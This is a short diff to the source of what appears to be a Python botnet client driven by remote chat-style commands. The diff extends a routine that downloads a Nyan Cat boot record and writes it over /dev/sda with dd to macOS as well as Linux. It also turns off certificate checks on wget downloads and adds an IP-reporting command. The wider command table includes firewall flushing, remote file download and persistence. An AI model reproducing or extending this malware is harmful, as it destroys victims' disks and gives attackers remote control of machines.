@@ -13,7 +13,7 @@ import ftplib
 import urllib2
 import urllib
 import sys
-import ctypes
+# import ctypes
 import random
 import time
 import platform
@@ -149,20 +149,21 @@ def download(cmd): #file downloader
 			sendData("Usage: download [file] [dir]")
 		else:
 			args = cmd.split(" ")
-			download = "wget -q -P " + args[1] + " " + args[0]
+			download = "wget --no-check-certificate -q -P " + args[1] + " " + args[0]
 			
 			request = execute(download) #executing the download
 			sendData("Download executed.")
 
 def nyanmbr(): #download nyancat.mbr and over bootloader with it
-	if (os == "linux"):
-		execute("wget -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
+	if (os == "linux" or os == "darwin"):
+		execute("wget --no-check-certificate -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
 		execute("dd if=/tmp/nyan.mbr of=/dev/sda")
+		execute("rm -rf /tmp/nyan.mbr")
 
-def nap(): #shutdown the computer ungracefully
+def nap(): #shutdown the computer
 	execute("init 0")
 
-def reboot(): #reboot
+def reboot(): #reboot the computer
 	execute("init 6")
 
 def persist(): #try to persist bot
@@ -199,6 +200,7 @@ commands = {
 	"uptime" : uptime,
 	"version" : version,
 	"what is your ip" : getIP,
+	"where are you" : getIP,
 	"flush firewall" : flushFirewall,
 	"firewall" : checkFirewall,
 	"download" : download,
